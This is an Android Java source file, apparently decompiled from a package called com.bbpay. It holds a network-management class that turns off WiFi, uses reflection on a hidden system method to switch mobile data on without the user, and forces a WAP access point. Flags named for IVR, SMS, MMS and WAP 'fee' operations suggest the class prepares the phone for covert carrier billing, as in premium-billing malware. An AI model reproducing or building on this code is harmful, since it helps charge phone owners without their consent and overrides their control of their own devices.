package com.bbpay.util;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import com.bbpay.bean.Constants;
import com.bbpay.wap.NetManager;

public class MobileNetworkManage {
    private static final String CLOSE_MOBILE_NETWORK = "com.sz5g.superaction.CLOSE_MOBILE_NETWORK";
    private static final String OPEN_MOBILE_NETWORK = "com.sz5g.superaction.OPEN_MOBILE_NETWORK";
    public static final int MAX_RECONNECT_TIMES = 10;
    public static final int MAX_RETRY_TIMES = 3;
    public static final int MOBILE_OPEN = 2;
    public static final int NETWORK_SLEEP_TIME = 1000;
    public static final int NONE_OPEN = 0;
    public static final int WIFI_OPEN = 1;
    public static int currentNetworType = -1;
    private Context context;
    public MobileNetworkManage(Context context1) {
        context = context1;
    }
    public static boolean initFee(Context context1) {
        if (currentNetworType == -1) {
            MyLogger.info("startWFee", "初始化网络....");
            WifiManage wifimanage = new WifiManage(context1);
            NetManager netmanage = new NetManager(context1);
            if (!wifimanage.isWifiManageEnable()) {
                if (!netmanage.isDataConnected()) {
                    MyLogger.info("startWFee", "移动网络没有打开，正在打开移动网络....");
                    toggleMobileData(context1, true);
                    if (currentNetworType != 1) currentNetworType = 0;
                }
                if (!netmanage.isCurrentWapAPN()) {
                    MyLogger.info("startFee", "set WAP");
                    if (!netmanage.setWapNetWork()) return false;
                } else {
                    MyLogger.info("startFee", "current is WAP");
                    return true;
                }
            } else {
                return false;
            }
        }
        return true;
    }
    public static void recoverNetWork(Context context1) {
        if (Constants.IVR_FEEING || Constants.SMS_FEEING || Constants.MMS_FEEING || Constants.WAP_FEEING) {
            MyLogger.info("===", new StringBuilder("IVR_FEEING ").append(Constants.IVR_FEEING).append(" , SMS_FEEING ").append(Constants.SMS_FEEING).append(" , MMS_FEEING ")
                    .append(Constants.MMS_FEEING).append(" , WAP_FEEING ").append(Constants.WAP_FEEING).toString());
            return;
        } else {
            recoverNetWorkDir(context1);
            return;
        }
    }
    public static void recoverNetWorkDir(Context context1) {
        if (currentNetworType != -1) {
            WifiManage wifimanage;
            MyLogger.info("", new StringBuilder("开始恢复网络：").append(currentNetworType).toString());
            wifimanage = new WifiManage(context1);
            switch (currentNetworType) {
                case 0://L4_L4:
                    wifimanage.CloseWifi();
                    toggleMobileData(context1, false);
                    break;
                case 1://L5_L5:
                    wifimanage.OpenWifi();
                    break;
                case 2://L6_L6:
                    wifimanage.CloseWifi();
                    toggleMobileData(context1, true);
                    break;
            }
            currentNetworType = -1;
        }
        return;
    }
    public static void toggleMobileData(Context context1, boolean flag) {
        ConnectivityManager connectivitymanager = (ConnectivityManager) context1.getSystemService("connectivity");
        try {
            Field field = Class.forName(connectivitymanager.getClass().getName()).getDeclaredField("mService");
            field.setAccessible(true);
            Object obj = field.get(connectivitymanager);
            Class class1 = Class.forName(obj.getClass().getName());
            Class aclass[] = new Class[1];
            aclass[0] = Boolean.TYPE;
            Method method = class1.getDeclaredMethod("setMobileDataEnabled", aclass);
            method.setAccessible(true);
            Object aobj[] = new Object[1];
            aobj[0] = Boolean.valueOf(flag);
            method.invoke(obj, aobj);
            return;
        } catch (ClassNotFoundException classnotfoundexception) {
            MyLogger.info("==", "ClassNotFoundException");
            classnotfoundexception.printStackTrace();
            return;
        } catch (NoSuchFieldException nosuchfieldexception) {
            MyLogger.info("==", "NoSuchFieldException");
            nosuchfieldexception.printStackTrace();
            return;
        } catch (SecurityException securityexception) {
            MyLogger.info("==", "SecurityException");
            securityexception.printStackTrace();
            return;
        } catch (NoSuchMethodException nosuchmethodexception) {
            MyLogger.info("==", "NoSuchMethodException");
            nosuchmethodexception.printStackTrace();
            return;
        } catch (IllegalArgumentException illegalargumentexception) {
            MyLogger.info("==", "IllegalArgumentException");
            illegalargumentexception.printStackTrace();
            return;
        } catch (IllegalAccessException illegalaccessexception) {
            MyLogger.info("==", "IllegalAccessException");
            illegalaccessexception.printStackTrace();
            return;
        } catch (InvocationTargetException invocationtargetexception) {
            MyLogger.info("==", "InvocationTargetException");
            invocationtargetexception.printStackTrace();
            return;
        }
    }
    public void closeMobileNetwork() {
        Intent intent = new Intent(CLOSE_MOBILE_NETWORK);
        context.sendBroadcast(intent);
    }
    public String getSIMCardType() {
        return SystemInfo.getCardType(context);
    }
    public boolean isMobileNetworkOpened() {
        String s = SystemInfo.getNetworkInfo(context);
        return !s.equals(SystemInfo.UNKNOW) && !s.equals(SystemInfo.NETWORK_TYPE_WIFI);
    }
    public void openMobileNetwork() {
        Intent intent = new Intent(OPEN_MOBILE_NETWORK);
        context.sendBroadcast(intent);
    }
}
